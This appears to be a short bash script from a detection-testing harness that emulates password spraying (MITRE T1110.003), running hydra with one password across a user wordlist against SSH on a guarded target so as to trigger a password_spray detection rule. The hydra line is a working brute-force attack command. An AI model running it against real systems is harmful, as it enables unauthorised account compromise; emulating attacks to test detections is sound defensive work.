#!/bin/bash
# T1110.003 Password Spraying: one password across many users → password_spray (>=5 users/300s).
set -euo pipefail
cd "$(dirname "$0")/.."
. ./lib.sh
guard_target
hydra -L wordlists/users.txt -p 'Spring2026!' -t 4 "ssh://$TARGET" || true
